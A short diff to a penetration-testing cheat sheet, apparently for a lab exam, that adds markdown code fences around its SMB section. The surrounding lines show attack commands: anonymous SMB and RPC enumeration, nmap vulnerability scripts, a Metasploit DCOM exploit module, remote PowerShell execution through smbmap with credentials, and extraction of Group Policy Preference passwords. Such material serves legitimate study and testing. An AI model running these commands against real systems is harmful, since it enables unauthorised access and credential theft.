@@ -246,7 +246,7 @@ msf > use exploit/windows/dcerpc/ms03_026_dcom
 
 ## Port 139/445 - SMB
 
-
+```
 # Enum hostname
 enum4linux -n 10.11.1.111
 nmblookup -A 10.11.1.111
@@ -291,10 +291,12 @@ smbclient -L 10.11.1.111
 smbclient //10.11.1.111/tmp
 smbclient \\\\10.11.1.111\\ipc$ -U john
 smbclient //10.11.1.111/ipc$ -U john  
+```
 
 rpcclient -U " " 10.11.1.111
 rpcclient -U " " -N 10.11.1.111
 
+```
 # Check vulns
 nmap --script smb-vuln* -p139,445 -T4 -Pn 10.11.1.111
 
@@ -339,7 +341,7 @@ smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -c
 
 # Check
 \Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "
-
+```
 
 smbtree 10.11.1.111
 
